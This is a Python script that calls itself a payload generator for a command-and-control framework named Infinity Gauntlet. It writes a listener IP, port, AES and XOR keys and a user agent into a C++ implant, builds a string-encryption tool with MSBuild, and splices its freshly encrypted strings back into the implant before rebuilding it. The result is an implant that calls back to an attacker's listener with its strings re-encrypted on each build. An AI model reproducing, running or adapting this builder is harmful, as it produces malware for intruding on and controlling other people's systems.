import re
import os
import argparse
import json
import subprocess

def update_pairs(file_path, updates):    
    try:
        print(f"Updating encrypted strings with listener details...")

        with open(file_path, 'r') as file:
            content = file.read()

        pair_re = r'{"(\w+)",\s*"([^"]*)"}'

        def repl(match):
            key, value = match.groups()
            if key in updates:
                return '{{"{0}", "{1}"}}'.format(key, updates[key])
            else:
                return match.group(0)

        updated_content = re.sub(pair_re, repl, content)

        with open(file_path, 'w') as file:
            file.write(updated_content)

    except Exception as e:
        print(f"An error occurred updating file: {e}")

def build_solution_with_vs_tools(is_stringcrypt, configuration="Release", platform="x64"):
    # Prepare the solution path, get the full path of the current script
    script_path = os.path.realpath(__file__)
    # Get the directory of the current script
    script_dir = os.path.dirname(script_path)
    # Move up one directory from the script directory
    parent_dir = os.path.dirname(script_dir)
    # Construct the path to the solution file
    if not is_stringcrypt:
        solution_path = os.path.join(parent_dir, "InfinityGauntlet", "C++", "InfinityGauntlet", "InfinityGauntlet.vcxproj")
    else:
        solution_path = os.path.join(parent_dir, "InfinityGauntlet", "C++", "InfinityGauntlet", "StringCrypt", "StringCrypt.vcxproj")

    # Command to launch the Visual Studio Developer Command Prompt environment
    vs_tools_cmd = r'"C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat"'

    # Construct the MSBuild command
    msbuild_command = f'msbuild "{solution_path}" /p:Configuration={configuration} /p:Platform={platform} /t:Rebuild'
    
    # Full command that sets up the environment and runs MSBuild
    full_command = f'cmd.exe /c "{vs_tools_cmd} && {msbuild_command}"'
    
    try:
        print(f"Building solution with command: {full_command}")

        # Execute the command
        result = subprocess.run(full_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
        # Check the result
        if result.returncode == 0:
            print("Build succeeded.")
        else:
            print("Build failed.")
            print(result.stderr)

    except Exception as e:
        print(f"An error occurred building solution: {e}")

def capture_output_between_markers(start_marker, end_marker, executable_path, prepend_spaces):
    try:
        # Flag to keep track of when to start capturing output
        capture = False
        
        # List to store the captured lines
        captured_lines = []
        
        # Execute the process
        with subprocess.Popen(executable_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as process:
            # Iterate over each line of output
            for line in process.stdout:
                # Check for the start marker
                if start_marker in line:
                    capture = True
                    continue  # Skip the marker line itself
                
                # Check for the end marker
                if end_marker in line:
                    capture = False
                    break  # Stop reading after the end marker
                
                # If we're between the markers, capture the line
                if capture:
                    captured_lines.append(line.strip())  # .strip() removes leading/trailing whitespace
        
        if prepend_spaces:
            # Prepend four spaces to each line and ensure it ends with a newline character
            return [('    ' + line).rstrip() + '\n' for line in captured_lines]
        else:
            return [line if line.endswith('\n') else line + '\n' for line in captured_lines]

    except Exception as e:
        print(f"An error occurred capturing output: {e}")

def replace_section_in_file(start_marker, end_marker, file_path, new_content):
    try:
        # Read the original content of the file
        with open(file_path, 'r') as file:
            lines = file.readlines()

        # Flags to track whether we're in the section to replace
        in_section = False
        start_index = 0
        end_index = 0

        # Iterate through the lines to find the section to replace
        for i, line in enumerate(lines):
            if start_marker in line:
                in_section = True
                start_index = i
                continue
            if in_section and end_marker in line:
                end_index = i
                break
            
        # Replace the section with new content if the section was found
        if in_section:
            updated_lines = lines[:start_index + 1] + new_content + lines[end_index:]
        else:
            updated_lines = lines

        # Write the updated content back to the file
        with open(file_path, 'w') as file:
            file.writelines(updated_lines)

    except Exception as e:
        print(f"An error occurred replacing section in file: {e}")

def main():
    try:
        # Argument parser
        parser = argparse.ArgumentParser(description="Payload generator for Infinity Gauntlet. Don't move the script and execute it, should be run from the server directory. Must be run from Windows.")
        parser.add_argument("json_file", help="Path to the JSON file payload config.")
        parser.add_argument("ip", help="IP of the listener.")

        # Parse arguments
        args = parser.parse_args()

        # Parse the JSON file
        with open(args.json_file, 'r') as json_file:
            data = json.load(json_file)

        # Dictionary of updates (key: new value)
        updates = {
            "IP_CRYPT": args.ip,
            "PORT_CRYPT": data["Port"],
            "AESKEY_CRYPT": data["AesKey"],
            "XORKEY_CRYPT": data["XorKey"],
            "IV_CRYPT": data["IV"],
            "USERAGENT_CRYPT": data["UserAgent"],
        }

        cpp_file_path = '../InfinityGauntlet/C++/InfinityGauntlet/StringCrypt/Main.cpp'

        # Update the file with data from JSON
        update_pairs(cpp_file_path, updates)

        # Build the solution
        build_solution_with_vs_tools(True)

        # Generate new random strings for payload and replace the current ones
        print("Generating new encrypted strings for payload...")
        new_random_strings = capture_output_between_markers('// BEGIN ENCRYPTED STRINGS', '// END ENCRYPTED STRINGS', '../InfinityGauntlet/C++/InfinityGauntlet/StringCrypt/x64/Release/StringCrypt.exe', True)    
        replace_section_in_file('StringCrypt::StringCrypt() {', '}', '../InfinityGauntlet/C++/InfinityGauntlet/StringCrypt.cpp', new_random_strings)
        new_definitions = capture_output_between_markers('// BEGIN DEFINITIONS DON\'T REMOVE', '// END DEFINITIONS DON\'T REMOVE', '../InfinityGauntlet/C++/InfinityGauntlet/StringCrypt/x64/Release/StringCrypt.exe', True)
        replace_section_in_file('// BEGIN DEFINITIONS DON\'T REMOVE', '// END DEFINITIONS DON\'T REMOVE', '../InfinityGauntlet/C++/InfinityGauntlet/StringCrypt.hpp', new_definitions)
        new_static_storage = capture_output_between_markers('// BEGIN STATIC STORAGE DON\'T REMOVE', '// END STATIC STORAGE DON\'T REMOVE', '../InfinityGauntlet/C++/InfinityGauntlet/StringCrypt/x64/Release/StringCrypt.exe', False)
        replace_section_in_file('// BEGIN STATIC STORAGE DON\'T REMOVE', '// END STATIC STORAGE DON\'T REMOVE', '../InfinityGauntlet/C++/InfinityGauntlet/StringCrypt.cpp', new_static_storage)

        # Build the solution again
        build_solution_with_vs_tools(False)

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
